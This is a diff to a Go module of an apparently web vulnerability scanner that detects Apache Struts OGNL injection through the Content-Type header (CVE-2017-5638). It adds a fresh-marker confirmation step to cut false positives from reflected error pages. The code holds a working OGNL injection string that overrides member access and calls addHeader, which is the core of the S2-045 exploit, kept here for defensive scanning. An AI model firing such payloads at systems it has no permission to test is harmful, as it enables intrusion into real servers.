@@ -18,6 +18,15 @@ import (
 const (
 	ognlMultA = 41273
 	ognlMultB = 39127
+
+	// strutsTestHeader is the response header a genuine OGNL evaluation of the
+	// addHeader() payload emits. Detection of the header-add variant keys on this
+	// being a REAL parsed response header — never on the marker merely appearing
+	// in the body — because a gateway that rejects the request (415 / 400) commonly
+	// echoes the injected Content-Type verbatim into the error body and into other
+	// header VALUES (e.g. gRPC's Grpc-Message), which reflects both "X-Struts-Test"
+	// and the baked marker without any OGNL ever running. See headerAddContentType.
+	strutsTestHeader = "X-Struts-Test"
 )
 
 // ognlResult is the product the injected OGNL expression evaluates to. It is
@@ -27,6 +36,15 @@ const (
 // Deriving it keeps the marker in lockstep with the operands forever. The product
 // fits under Java's 32-bit Integer.MAX_VALUE, so OGNL's int*int does not overflow.
 var ognlResult = strconv.Itoa(ognlMultA * ognlMultB)
+
+// headerAddContentType builds the "add a response header" OGNL Content-Type
+// payload (CVE-2017-5638 / S2-045 style) that sets X-Struts-Test to the supplied
+// marker. Genuine evaluation surfaces the marker as a real response HEADER, which
+// a reflected error body cannot forge — so both detection and confirmation read
+// the parsed header rather than scanning the response text.
+func headerAddContentType(marker string) string {
+	return fmt.Sprintf("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('%s','%s'))}", strutsTestHeader, marker)
+}
 
 // ognlPrimaryExpr is the literal multiplication embedded in the math payloads
 // (ognlMultA*ognlMultB). The reflection-tracking confirmation swaps exactly this
@@ -44,11 +62,10 @@ var ognlPrimaryExpr = strconv.Itoa(ognlMultA) + "*" + strconv.Itoa(ognlMultB)
 // round; a page that merely contains the fixed product (1614888671 — a plausible id
 // / old unix timestamp) cannot predict a fresh random product, so it is dropped.
 //
-// A matched payload that does NOT carry the A*B expression (the X-Struts-Test
-// header-add variant, which bakes the literal product) is already corroborated by
-// the injected response header, so it is treated as confirmed. Returns
-// (confirmed, err): err != nil (transport/parse failure) makes the caller fail
-// OPEN rather than suppress a genuine finding.
+// The header-add variant carries no A*B expression to track and is confirmed
+// separately by confirmHeaderAddEvaluates. Returns (confirmed, err): err != nil
+// (transport/parse failure) makes the caller fail OPEN rather than suppress a
+// genuine finding.
 func (m *Module) confirmOgnlEvaluates(
 	ctx *httpmsg.HttpRequestResponse,
 	httpClient *http.Requester,
@@ -56,7 +73,7 @@ func (m *Module) confirmOgnlEvaluates(
 	reinject func(payload string) ([]byte, bool),
 ) (bool, error) {
 	if !strings.Contains(matchedPayload, ognlPrimaryExpr) {
-		return true, nil // header-corroborated variant: no A*B expression to track
+		return true, nil // no A*B expression to track (header-add path is confirmed elsewhere)
 	}
 	const rounds = 2
 	for i := 0; i < rounds; i++ {
@@ -85,16 +102,57 @@ func (m *Module) confirmOgnlEvaluates(
 	return true, nil
 }
 
-// contentTypePayload defines a Content-Type OGNL injection test case.
+// confirmHeaderAddEvaluates re-injects the addHeader OGNL payload with a FRESH
+// random marker and requires that exact marker to come back as a genuine
+// X-Struts-Test RESPONSE HEADER on each round. A gateway that merely reflects the
+// injected Content-Type into an error body echoes the baked static marker but can
+// never emit an arbitrary header the scanner picks at request time, so only real
+// server-side OGNL evaluation tracks the fresh marker. reinject applies a
+// Content-Type string to the request exactly as the matching probe did and returns
+// the raw request (ok=false when it cannot be rebuilt → fail open). Returns
+// (confirmed, err): err != nil (transport failure) makes the caller fail OPEN.
+func (m *Module) confirmHeaderAddEvaluates(
+	ctx *httpmsg.HttpRequestResponse,
+	httpClient *http.Requester,
+	reinject func(contentType string) ([]byte, bool),
+) (bool, error) {
+	const rounds = 2
+	for i := 0; i < rounds; i++ {
+		marker := modkit.FreshCanary()
+		raw, ok := reinject(headerAddContentType(marker))
+		if !ok {
+			return true, nil // cannot rebuild the probe → fail open
+		}
+		req := httpmsg.NewRequestResponseRaw(raw, ctx.Service())
+		resp, _, err := httpClient.Execute(req, http.Options{NoClustering: true})
+		if err != nil {
+			return false, err
+		}
+		httpResp := resp.Response()
+		hit := httpResp != nil && strings.Contains(httpResp.Header.Get(strutsTestHeader), marker)
+		resp.Close()
+		if !hit {
+			return false, nil // fresh marker never became a real header → reflected/static
+		}
+	}
+	return true, nil
+}
+
+// contentTypePayload defines a Content-Type OGNL injection test case. headerAdd
+// selects the confirmation-and-detection strategy: true reads the genuine
+// X-Struts-Test response header (addHeader variant), false searches the body for
+// the evaluated product (arithmetic variant).
 type contentTypePayload struct {
 	name        string
 	contentType string
+	headerAdd   bool
 }
 
 var contentTypePayloads = []contentTypePayload{
 	{
 		name:        "struts2-ct-ognl",
-		contentType: fmt.Sprintf("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('X-Struts-Test','%d'))}", ognlMultA*ognlMultB),
+		contentType: headerAddContentType(ognlResult),
+		headerAdd:   true,
 	},
 	{
 		name:        "struts2-ct-simple",
@@ -186,20 +244,52 @@ func (m *Module) ScanPerRequest(
 			continue
 		}
 
-		// Check for OGNL evaluation evidence
-		body := resp.Body().String()
-		fullResp := resp.FullResponseString()
+		// Check for OGNL evaluation evidence. The two payload shapes have DIFFERENT
+		// genuine signals, and conflating them is what let a reflected error body
+		// (415 "Content-Type '<echoed payload>' is not supported") masquerade as a
+		// hit — the echo carries both "X-Struts-Test" and the baked marker.
+		var (
+			matched     bool
+			description string
+		)
+		if p.headerAdd {
+			// addHeader variant: the ONLY genuine proof is a real X-Struts-Test
+			// RESPONSE HEADER (a distinct parsed key). Reflection into the body or
+			// into another header's value cannot forge that key, so scan only the
+			// parsed headers here.
+			httpResp := resp.Response()
+			matched = httpResp != nil && strings.Contains(httpResp.Header.Get(strutsTestHeader), ognlResult)
+			description = fmt.Sprintf("OGNL expression evaluated in Content-Type header — computed result %q returned as the %s response header", ognlResult, strutsTestHeader)
+		} else {
+			// Arithmetic variant: the product only appears when OGNL computes A*B.
+			// The payload string itself ("%{41273*39127}") never contains the
+			// product, so a verbatim reflection cannot produce it — strip any
+			// reflected payload copy anyway before searching, as defense in depth.
+			cleaned := modkit.StripReflected(resp.Body().String(), p.contentType)
+			matched = strings.Contains(cleaned, ognlResult)
+			description = fmt.Sprintf("OGNL expression evaluated in Content-Type header — result %q found in response body", ognlResult)
+		}
 
-		if strings.Contains(body, ognlResult) || strings.Contains(fullResp, "X-Struts-Test") && strings.Contains(fullResp, ognlResult) {
+		if matched {
+			fullResp := resp.FullResponseString()
 			resp.Close()
-			// Confirm the result tracks fresh operands before reporting a Critical
-			// finding: a page that contains 1614244871 for an unrelated reason would
-			// otherwise match the fixed product without any OGNL ever evaluating.
-			ctVal := p.contentType
-			if confirmed, cerr := m.confirmOgnlEvaluates(ctx, httpClient, ctVal, func(payload string) ([]byte, bool) {
-				raw, err := httpmsg.SetContentType(ctx.Request().Raw(), payload)
+			// Confirm the signal tracks a FRESH probe before reporting a Critical
+			// finding: the arithmetic variant re-derives the product from fresh
+			// operands, the header-add variant re-injects a fresh marker and requires
+			// it back as a real header — so a static page carrying the baked marker
+			// (or a fixed number in the body) can never be confirmed.
+			reinject := func(contentType string) ([]byte, bool) {
+				raw, err := httpmsg.SetContentType(ctx.Request().Raw(), contentType)
 				return raw, err == nil
-			}); cerr == nil && !confirmed {
+			}
+			var confirmed bool
+			var cerr error
+			if p.headerAdd {
+				confirmed, cerr = m.confirmHeaderAddEvaluates(ctx, httpClient, reinject)
+			} else {
+				confirmed, cerr = m.confirmOgnlEvaluates(ctx, httpClient, p.contentType, reinject)
+			}
+			if cerr == nil && !confirmed {
 				continue
 			}
 			result := &output.ResultEvent{
@@ -211,7 +301,7 @@ func (m *Module) ScanPerRequest(
 				ExtractedResults: []string{ognlResult},
 				Info: output.Info{
 					Name:        fmt.Sprintf("Struts OGNL Injection: %s", p.name),
-					Description: fmt.Sprintf("OGNL expression evaluated in Content-Type header — result %q found in response", ognlResult),
+					Description: description,
 				},
 			}
 			return []*output.ResultEvent{result}, nil
